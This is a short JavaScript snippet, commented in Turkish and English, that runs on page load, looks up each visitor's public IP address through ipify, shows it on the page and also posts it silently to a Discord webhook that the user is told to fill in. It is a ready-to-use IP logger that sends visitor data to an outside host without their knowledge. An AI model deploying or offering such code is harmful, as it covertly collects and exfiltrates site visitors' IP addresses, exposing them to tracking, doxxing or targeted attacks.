function displayIP() {
    var ip = '';
    fetch('https://api.ipify.org/?format=json')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            ip = data.ip;
            var webhook = 'WEBHOOK-URL'; // Size ait bir Discord webhook ile değiştirin. // Replace it with a Discord webhook that belongs to you.
            var message = {
                content: 'IP: ' + ip
            };
            
            var ipElement = document.getElementById('ip');
            ipElement.textContent = ip;

            fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        });
}

document.addEventListener('DOMContentLoaded', displayIP);